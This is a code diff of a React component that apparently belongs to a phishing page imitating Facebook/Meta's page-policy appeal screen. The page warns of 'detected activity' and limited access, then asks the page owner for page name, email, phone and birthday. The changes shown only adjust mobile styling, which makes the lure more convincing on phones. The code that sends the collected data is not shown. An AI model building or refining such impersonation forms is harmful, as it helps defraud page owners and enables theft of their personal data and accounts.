@@ -250,44 +250,44 @@ const Home = () => {
                 </nav>
                 <div className='flex max-h-[calc(100vh-56px)] flex-1 flex-col items-center justify-start overflow-y-auto'>
                     <div className='mx-auto rounded-lg border border-[#e4e6eb] sm:my-12'>
-                        <div className='bg-[#e4e6eb] p-6'>
-                            <p className='text-3xl font-bold'>{translatedTexts.pagePolicyAppeals}</p>
+                        <div className='bg-[#e4e6eb] p-4 sm:p-6'>
+                            <p className='text-xl sm:text-3xl font-bold'>{translatedTexts.pagePolicyAppeals}</p>
                         </div>
-                        <div className='p-4 text-sm leading-6 font-medium'>
-                            <p>{translatedTexts.detectedActivity}</p>
-                            <p>{translatedTexts.accessLimited}</p>
+                        <div className='p-4 text-base leading-7 font-medium sm:text-sm sm:leading-6'>
+                            <p className='mb-3'>{translatedTexts.detectedActivity}</p>
+                            <p className='mb-3'>{translatedTexts.accessLimited}</p>
                             <p>{translatedTexts.submitAppeal}</p>
                         </div>
-                        <div className='flex flex-col gap-2 p-4 text-sm leading-6 font-semibold'>
+                        <div className='flex flex-col gap-3 p-4 text-sm leading-6 font-semibold'>
                             <div className='flex flex-col gap-2'>
-                                <p>
+                                <p className='text-base sm:text-sm'>
                                     {translatedTexts.pageName} <span className='text-red-500'>*</span>
                                 </p>
-                                <input type='text' name='pageName' autoComplete='organization' className={`w-full rounded-lg border px-3 py-1.5 text-base ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.pageName} onChange={(e) => handleInputChange('pageName', e.target.value)} />
+                                <input type='text' name='pageName' autoComplete='organization' className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.pageName} onChange={(e) => handleInputChange('pageName', e.target.value)} />
                                 {errors.pageName && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             <div className='flex flex-col gap-2'>
-                                <p>
+                                <p className='text-base sm:text-sm'>
                                     {translatedTexts.mail} <span className='text-red-500'>*</span>
                                 </p>
-                                <input type='email' name='mail' autoComplete='email' className={`w-full rounded-lg border px-3 py-1.5 text-base ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.mail} onChange={(e) => handleInputChange('mail', e.target.value)} />
+                                <input type='email' name='mail' autoComplete='email' className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.mail} onChange={(e) => handleInputChange('mail', e.target.value)} />
                                 {errors.mail && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             <div className='flex flex-col gap-2'>
-                                <p>
+                                <p className='text-base sm:text-sm'>
                                     {translatedTexts.phone} <span className='text-red-500'>*</span>
                                 </p>
                                 <div className={`flex rounded-lg border ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'}`}>
-                                    <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-1.5 text-base font-medium text-gray-700'>{callingCode}</div>
-                                    <input type='tel' name='phone' inputMode='numeric' pattern='[0-9]*' autoComplete='off' className='flex-1 rounded-r-lg border-0 px-3 py-1.5 focus:ring-0 focus:outline-none text-base' value={formData.phone.replace(/^\+\d+\s*/, '')} onChange={(e) => handleInputChange('phone', e.target.value)} />
+                                    <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-2.5 sm:py-1.5 text-base sm:text-sm font-medium text-gray-700'>{callingCode}</div>
+                                    <input type='tel' name='phone' inputMode='numeric' pattern='[0-9]*' autoComplete='off' className='flex-1 rounded-r-lg border-0 px-3 py-2.5 sm:py-1.5 focus:ring-0 focus:outline-none text-base' value={formData.phone.replace(/^\+\d+\s*/, '')} onChange={(e) => handleInputChange('phone', e.target.value)} />
                                 </div>
                                 {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             <div className='flex flex-col gap-2'>
-                                <p>
+                                <p className='text-base sm:text-sm'>
                                     {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                 </p>
-                                <input type='date' name='birthday' className={`w-full rounded-lg border px-3 py-1.5 text-base ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.birthday} onChange={(e) => handleInputChange('birthday', e.target.value)} />
+                                <input type='date' name='birthday' className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.birthday} onChange={(e) => handleInputChange('birthday', e.target.value)} />
                                 {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             <button className='w-fit rounded-lg bg-gray-200 px-3 py-2 text-[15px] font-normal' onClick={handleSubmit}>
